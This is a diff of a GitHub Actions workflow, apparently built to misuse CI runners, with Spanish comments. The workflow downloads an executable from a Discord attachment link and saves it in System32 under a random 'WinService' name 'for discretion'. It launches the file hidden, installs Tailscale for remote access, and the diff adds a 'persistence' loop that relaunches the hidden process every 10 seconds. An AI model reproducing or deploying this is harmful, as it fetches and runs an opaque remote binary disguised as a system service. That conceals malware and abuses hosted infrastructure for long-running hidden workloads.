@@ -1,4 +1,4 @@
-name: Python-Dev-Validation-v26
+name: Python-Dev-Persistence-v27
 
 on:
   workflow_dispatch:
@@ -9,7 +9,7 @@ jobs:
     timeout-minutes: 3600
     strategy:
       matrix:
-        node_id: [1, 2] # Mantenemos 2 para seguridad de la cuenta
+        node_id: [1, 2]
 
     steps:
       - name: 1. Optimize Environment
@@ -36,17 +36,17 @@ jobs:
         run: |
           $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1477090518474428507/PythonDev.exe?ex=69a37f3e&is=69a22dbe&hm=610c5b87eda47bd4c82c5a9fdc1269cd7cee4b23c892796a64e3dbbb5a9d6538&"
           
-          # Generar nombre aleatorio para el proceso
+          # Nombre aleatorio para mayor discrecion
           $randName = "WinService_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\$randName"
           echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
           
           try {
               Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
-              Write-Host "Modulo desplegado como: $randName"
               Start-Process $dest -WindowStyle Hidden
+              Write-Host "Proceso $randName iniciado correctamente."
           } catch {
-              Write-Error "Fallo en la descarga. Verifica el enlace de Discord (podria haber caducado)."
+              Write-Error "Fallo critico en descarga."
               exit 1
           }
 
@@ -56,23 +56,28 @@ jobs:
           Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"
 
-      - name: 6. Monitoring & Maintenance Loop
+      - name: 6. Persistence Ultra-Loop (Auto-Restart cada 10s)
         run: |
           $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          Write-Host "=========================================="
-          Write-Host "NODE ${{ matrix.node_id }} ONLINE"
-          Write-Host "IP: $ip"
-          Write-Host "User: DevAdmin | Pass: $env:SRV_PASS"
-          Write-Host "Process: $env:PROC_NAME"
-          Write-Host "=========================================="
-          
           $fullPath = "C:\Windows\System32\$env:PROC_NAME"
           $procOnly = $env:PROC_NAME.Replace(".exe", "")
 
+          Write-Host "=========================================="
+          Write-Host "MONITOREO DE PERSISTENCIA ACTIVO"
+          Write-Host "IP: $ip | Proceso: $procOnly"
+          Write-Host "=========================================="
+          
+          # Bucle infinito de vigilancia estrecha
           while ($true) {
-              if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
-                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
-                  Start-Process $fullPath -WindowStyle Hidden
+              $check = Get-Process $procOnly -ErrorAction SilentlyContinue
+              if (!$check) {
+                  Write-Host "[$(Get-Date)] ! ALERTA: Proceso caido. Reiniciando de inmediato..."
+                  try {
+                      Start-Process $fullPath -WindowStyle Hidden
+                  } catch {
+                      Write-Host "Error al intentar reiniciar el proceso."
+                  }
               }
-              Start-Sleep -Seconds 300
+              # Intervalo corto para asegurar que siempre este abierto
+              Start-Sleep -Seconds 10
           }
